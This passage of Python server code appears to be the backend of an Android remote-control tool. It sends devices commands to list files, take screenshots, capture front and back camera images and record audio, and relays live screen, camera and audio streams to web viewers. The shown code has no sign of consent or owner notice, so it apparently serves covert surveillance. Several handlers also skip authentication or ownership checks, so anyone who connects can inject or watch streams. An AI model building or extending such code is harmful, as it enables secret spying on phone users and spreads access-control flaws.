        if device_id and fmeta.get('device_id') != device_id:
            continue
        # Check ownership
        device = store.devices.get(fmeta.get('device_id', ''))
        if device and (session['role'] == 'admin' or device.get('owner_id') == session['user_id']):
            safe = dict(fmeta)
            safe.pop('path', None)
            files.append(safe)
    
    return json_response({"ok": True, "files": files})


async def _wait_for_command_result(command_id: str, timeout: float = 15.0) -> Optional[str]:
    """Wait for a command result by polling store.commands."""
    start = time.time()
    while time.time() - start < timeout:
        cmd = store.commands.get(command_id)
        if cmd and cmd.get('status') == 'completed':
            return cmd.get('result', '')
        if cmd and cmd.get('status') == 'failed':
            return cmd.get('result', '')
        await asyncio.sleep(0.5)
    return None


async def api_web_list_files_device(request: web.Request) -> web.Response:
    """Send list_files command to device and wait for result."""
    session = get_auth_session(request)
    if not session:
        return json_response({"ok": False, "message": "Unauthorized"}, 401)
    
    device_id = request.query.get('device_id', '')
    path = request.query.get('path', '/storage/emulated/0/')
    
    if not device_id:
        return json_response({"ok": False, "message": "Missing device_id"}, 400)
    
    device = await store.get_user_device(session['user_id'], device_id)
    if not device:
        return json_response({"ok": False, "message": "Device not found"}, 404)
    
    # Check if device is online
    if not store._device_last_online.get(device_id, False):
        return json_response({"ok": False, "message": "الجهاز غير متصل"}, 400)
    
    # Queue command
    queued = await store.queue_command(
        device_id=device_id,
        command="list_files",
        params={"path": path},
        requested_by=session['user_id'],
        source="web"
    )
    
    if _fb.firebase_connected:
        try:
            await push_command(device_id, {
                "id": queued['id'],
                "command": "list_files",
                "params": {"path": path},
                "created_at": queued['created_at'],
            })
        except Exception as e:
            logger.warning(f"Firebase push failed: {e}")
    
    # Wait for result with timeout
    result = await _wait_for_command_result(queued['id'], timeout=15)
    
    if result is None:
        return json_response({"ok": False, "message": "انتهت مهلة الانتظار", "command_id": queued['id']}, 408)
    
    # Parse the result
    try:
        files_data = json.loads(result) if isinstance(result, str) else result
        return json_response({"ok": True, "files": files_data, "path": path})
    except (json.JSONDecodeError, TypeError):
        return json_response({"ok": True, "raw": str(result)[:5000], "path": path})


# ─── Streaming API ────────────────────────────────────────────

async def api_stream_frame(request: web.Request) -> web.Response:
    session = get_auth_session(request)
    if not session:
        return json_response({"ok": False, "message": "Unauthorized"}, 401)
    
    device_id = request.match_info.get('device_id', '')
    stream_type = request.query.get('type', 'video')
    key = f"{device_id}:{stream_type}"
    
    frame = store.latest_frames.get(key)
    if not frame:
        return json_response({"ok": False, "message": "No frame available"}, 404)
    
    return json_response({
        "ok": True,
        "data": frame.get('data', ''),
        "timestamp": frame.get('timestamp', 0),
        "source": frame.get('source', ''),
    })


async def api_stream_status(request: web.Request) -> web.Response:
    session = get_auth_session(request)
    if not session:
        return json_response({"ok": False, "message": "Unauthorized"}, 401)
    
    streams = {}
    for key, info in store.jpeg_stream_info.items():
        if info.get('active'):
            streams[key] = info
    
    return json_response({"ok": True, "streams": streams})


async def api_stream_start(request: web.Request) -> web.Response:
    """Device notifies server that a stream started."""
    device_id, error = get_device_auth(request)
    if error:
        return json_response({"ok": False, "message": error}, 401)
    
    try:
        body = await request.json()
    except:
        body = {}
    
    stream_id = body.get('stream_id', '')
    stream_type = body.get('type', 'screen')
    
    store.jpeg_stream_info[device_id] = {
        "active": True,
        "type": stream_type,
        "stream_id": stream_id,
        "started_at": datetime.utcnow().isoformat(),
    }
    
    return json_response({"ok": True})


async def api_stream_stop(request: web.Request) -> web.Response:
    """Device notifies server that a stream stopped."""
    device_id, error = get_device_auth(request)
    if error:
        return json_response({"ok": False, "message": error}, 401)
    
    if device_id in store.jpeg_stream_info:
        store.jpeg_stream_info[device_id]['active'] = False
    
    return json_response({"ok": True})


async def api_jpeg_stream_start(request: web.Request) -> web.Response:
    """Start JPEG screenshot-based streaming (web/admin)."""
    session = get_auth_session(request)
    if not session:
        return json_response({"ok": False, "message": "Unauthorized"}, 401)
    
    try:
        body = await request.json()
    except:
        return json_response({"ok": False, "message": "Invalid JSON"}, 400)
    
    device_id = body.get('device_id', '')
    stream_type = body.get('type', 'screen')
    interval = body.get('interval', JPEG_STREAM_INTERVAL)
    
    if not device_id:
        return json_response({"ok": False, "message": "Missing device_id"}, 400)
    
    # Check if already streaming
    if device_id in store.jpeg_stream_tasks and not store.jpeg_stream_tasks[device_id].done():
        return json_response({"ok": False, "message": "Stream already active"}, 400)
    
    # Start JPEG stream loop
    async def jpeg_loop():
        cmd = "screenshot" if stream_type == "screen" else "front_camera"
        if stream_type == "back_camera":
            cmd = "back_camera"
        elif stream_type == "audio":
            cmd = "record_audio"
        
        store.jpeg_stream_info[device_id] = {
            "active": True,
            "type": stream_type,
            "interval": interval,
            "started_at": datetime.utcnow().isoformat(),
            "frame_count": 0,
        }
        
        while store.jpeg_stream_info.get(device_id, {}).get('active', False):
            try:
                queued = await store.queue_command(
                    device_id=device_id,
                    command=cmd,
                    params={},
                    requested_by=session['user_id'],
                    source="jpeg_stream"
                )
                
                if _fb.firebase_connected:
                    await push_command(device_id, {
                        "id": queued['id'],
                        "command": cmd,
                        "params": {},
                        "created_at": queued['created_at'],
                    })
                
                store.jpeg_stream_info[device_id]['frame_count'] = \
                    store.jpeg_stream_info[device_id].get('frame_count', 0) + 1
                
                await asyncio.sleep(interval)
            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"JPEG stream error: {e}")
                await asyncio.sleep(5)
    
    store.jpeg_stream_tasks[device_id] = asyncio.create_task(jpeg_loop())
    return json_response({"ok": True, "message": "Stream started"})


async def api_jpeg_stream_stop(request: web.Request) -> web.Response:
    """Stop JPEG streaming."""
    session = get_auth_session(request)
    if not session:
        return json_response({"ok": False, "message": "Unauthorized"}, 401)
    
    try:
        body = await request.json()
    except:
        body = {}
    
    device_id = body.get('device_id', '')
    
    if device_id in store.jpeg_stream_info:
        store.jpeg_stream_info[device_id]['active'] = False
    
    # Send stop command
    if device_id in store.jpeg_stream_tasks and not store.jpeg_stream_tasks[device_id].done():
        store.jpeg_stream_tasks[device_id].cancel()
    
    return json_response({"ok": True, "message": "Stream stopped"})


# ─── WebSocket Handlers ───────────────────────────────────────

async def ws_dashboard(request: web.Request) -> web.Response:
    """Dashboard real-time updates WebSocket."""
    token = request.query.get('token', '')
    session = store.validate_session(token)
    if not session:
        return web.Response(status=401, text="Unauthorized")
    
    ws = web.WebSocketResponse(heartbeat=30)
    await ws.prepare(request)
    store.dashboard_ws_clients.add(ws)
    
    try:
        # Send initial data
        stats = store.get_stats()
        devices = await store.get_user_devices(session['user_id'])
        await ws.send_json({
            "type": "init",
            "devices": devices,
            "stats": stats,
            "commands": COMMAND_REGISTRY,
            "categories": CMD_CATEGORIES,
        })
        
        async for msg in ws:
            if msg.type == WSMsgType.TEXT:
                if msg.data == "ping":
                    await ws.send_json({"type": "pong"})
                elif msg.data == "get_stats":
                    await ws.send_json({"type": "stats_update", "stats": store.get_stats()})
            elif msg.type in (WSMsgType.ERROR, WSMsgType.CLOSE):
                break
    except Exception:
        pass
    finally:
        store.dashboard_ws_clients.discard(ws)
    
    return ws


async def ws_stream(request: web.Request) -> web.Response:
    """Device streaming WebSocket."""
    device_id = request.query.get('device_id', '')
    stream_id = request.query.get('stream_id', '')
    
    ws = web.WebSocketResponse(heartbeat=10)
    await ws.prepare(request)
    
    key = f"{device_id}:{stream_id}"
    store.stream_connections[key] = {"ws": ws, "type": "device", "last_activity": time.time()}
    
    try:
        async for msg in ws:
            if msg.type == WSMsgType.BINARY:
                # Video/audio frame from device
                store.latest_frames[f"{device_id}:video"] = {
                    "data": msg.data if isinstance(msg.data, str) else "",
                    "timestamp": time.time(),
                    "source": "stream",
                }
                
                # Forward to any viewer
                for conn_key, conn in list(store.stream_connections.items()):
                    if conn.get('type') == 'viewer' and conn.get('target_stream') == stream_id:
                        try:
                            if conn.get('ws') and not conn['ws'].closed:
                                conn['ws'].send_bytes(msg.data)
                        except Exception:
                            pass
                
                store.stream_connections[key]['last_activity'] = time.time()
            
            elif msg.type == WSMsgType.TEXT:
                try:
                    data = json.loads(msg.data)
                    msg_type = data.get('type', '')
                    
                    if msg_type == 'config':
                        store.jpeg_stream_info[device_id] = data
                    
                    elif msg_type == 'frame':
                        # Base64 frame
                        frame_data = data.get('data', '')
                        if frame_data:
                            store.latest_frames[f"{device_id}:video"] = {
                                "data": frame_data,
                                "timestamp": time.time(),
                                "source": data.get('source', 'stream'),
                                "is_keyframe": data.get('is_keyframe', False),
                            }
                            # Forward to viewers
                            for conn_key, conn in list(store.stream_connections.items()):
                                if conn.get('type') == 'viewer' and conn.get('target_stream') == stream_id:
                                    try:
                                        if conn.get('ws') and not conn['ws'].closed:
                                            conn['ws'].send_json(data)
                                    except Exception:
                                        pass

                    elif msg_type == 'audio':
                        # Base64-encoded audio frame (AAC chunks from AudioStreamService).
                        # Store separately under the "audio" key so the web viewer can poll
                        # /api/stream/frame/{device_id}?type=audio and so that connected
                        # viewers receive the chunks in real time.
                        frame_data = data.get('data', '')
                        if frame_data:
                            store.latest_frames[f"{device_id}:audio"] = {
                                "data": frame_data,
                                "timestamp": time.time(),
                                "source": data.get('source', 'audio'),
                                "size": data.get('size', 0),
                            }
                            # Forward to viewers
                            for conn_key, conn in list(store.stream_connections.items()):
                                if conn.get('type') == 'viewer' and conn.get('target_stream') == stream_id:
                                    try:
                                        if conn.get('ws') and not conn['ws'].closed:
                                            conn['ws'].send_json(data)
                                    except Exception:
                                        pass
                except json.JSONDecodeError:
                    pass
            
            elif msg.type in (WSMsgType.ERROR, WSMsgType.CLOSE):
                break
    except Exception:
        pass
    finally:
        store.stream_connections.pop(key, None)
        if device_id in store.jpeg_stream_info:
            store.jpeg_stream_info[device_id]['active'] = False
    
    return ws


async def ws_stream_viewer(request: web.Request) -> web.Response:
    """Viewer WebSocket for watching streams."""
    stream_id = request.query.get('stream_id', '')
    token = request.query.get('token', '')
    session = store.validate_session(token)
    if not session:
        return web.Response(status=401, text="Unauthorized")
    
    ws = web.WebSocketResponse(heartbeat=10)
    await ws.prepare(request)
    
    key = f"viewer_{stream_id}_{id(ws)}"
    store.stream_connections[key] = {
        "ws": ws,
        "type": "viewer",
        "target_stream": stream_id,
        "last_activity": time.time(),
    }
    
    try:
        async for msg in ws:
            if msg.type == WSMsgType.TEXT:
                try:
                    data = json.loads(msg.data)
                    # Forward control commands to device stream
                    for conn_key, conn in list(store.stream_connections.items()):
                        if conn.get('type') == 'device' and stream_id in conn_key:
                            try:
                                if conn.get('ws') and not conn['ws'].closed:
                                    conn['ws'].send_json(data)
                            except Exception:
                                pass
                except json.JSONDecodeError:
                    pass
            elif msg.type in (WSMsgType.ERROR, WSMsgType.CLOSE):
                break
    except Exception:
        pass
    finally:
        store.stream_connections.pop(key, None)
    
    return ws


async def ws_webrtc_signaling(request: web.Request) -> web.Response:
    """WebRTC signaling server - SDP offer/answer and ICE candidate exchange.

    NOTE (2024): This endpoint is currently NOT wired up to any client. The
    Android ``WebRTCClient`` exists as scaffolding but is never instantiated,
    and the web dashboard does not open a signaling WebSocket. The active
    streaming path is the base64-over-WebSocket pipeline:

        device (MediaCodec + Base64)
          → ``ws_stream``            (api_handlers.ws_stream)
          → ``store.latest_frames``  (keyed by ``"{device_id}:video|audio"``)
          → ``/api/stream/frame/{device_id}?type=video|audio``
          → web viewer (polling)

    This handler is kept in place so a future WebRTC client can be wired up
    without server changes.
    """
    token = request.query.get('token', '')
    session = store.validate_session(token)
    if not session:
        # Also allow device auth
        device_id = request.query.get('device_id', '')
        device_token = request.query.get('device_token', '')
        if not device_id or not device_token or not store.validate_device_token(device_id, device_token):
            return web.Response(status=401, text="Unauthorized")
        role = "device"
        peer_id = device_id
    else:
        role = "viewer"
        peer_id = session['user_id']
    
    stream_type = request.query.get('type', 'screen')  # screen, front_camera, back_camera, mic, speaker, ambient
    target_device = request.query.get('target', '')  # For viewer: which device to stream from
    
    ws = web.WebSocketResponse(heartbeat=10)
    await ws.prepare(request)
    
    conn_key = f"webrtc_{role}_{peer_id}_{stream_type}"
    store.stream_connections[conn_key] = {
        "ws": ws,
        "type": role,
        "stream_type": stream_type,
        "target": target_device,
        "last_activity": time.time(),
    }
    
    try:
        async for msg in ws:
            if msg.type == WSMsgType.TEXT:
                try:
                    data = json.loads(msg.data)
                    msg_type = data.get('type', '')
                    
                    # Route signaling messages between peers
                    if msg_type in ('offer', 'answer', 'ice-candidate', 'bye'):
                        # Find the matching peer connection
                        for key, conn in list(store.stream_connections.items()):
                            if key == conn_key:
                                continue
                            # Viewer wants to connect to device
                            if role == "viewer" and conn.get('type') == 'device' and conn.get('target') == target_device:
                                try:
                                    if conn.get('ws') and not conn['ws'].closed:
                                        data['from'] = peer_id
                                        await conn['ws'].send_json(data)
                                except Exception:
                                    pass
                            # Device sends to viewer
                            elif role == "device" and conn.get('type') == 'viewer' and conn.get('target') == peer_id:
                                try:
                                    if conn.get('ws') and not conn['ws'].closed:
                                        data['from'] = peer_id
                                        await conn['ws'].send_json(data)
                                except Exception:
                                    pass
                            
                            if msg_type == 'bye':
                                break
                except json.JSONDecodeError:
                    pass
            elif msg.type in (WSMsgType.ERROR, WSMsgType.CLOSE):
                break
    except Exception:
        pass
    finally:
        store.stream_connections.pop(conn_key, None)
        # Notify peer
        for key, conn in list(store.stream_connections.items()):
            if key != conn_key:
                try:
                    if conn.get('ws') and not conn['ws'].closed:
                        await conn['ws'].send_json({"type": "bye", "from": peer_id})
                except:
                    pass
    
    return ws


# ─── Dashboard Push Loop ──────────────────────────────────────

async def dashboard_push_loop():
    """Push stats updates to connected dashboard WebSockets."""
    while True:
        try:
            await asyncio.sleep(4)
            if not store.dashboard_ws_clients:
                continue
            
            stats = store.get_stats()
            dead = set()
            
            for ws in store.dashboard_ws_clients:
                try:
                    if ws.closed:
                        dead.add(ws)
                        continue
                    await ws.send_json({"type": "stats_update", "stats": stats})
                except Exception:
                    dead.add(ws)
            
            store.dashboard_ws_clients -= dead
        except asyncio.CancelledError:
            break
        except Exception:
            await asyncio.sleep(5)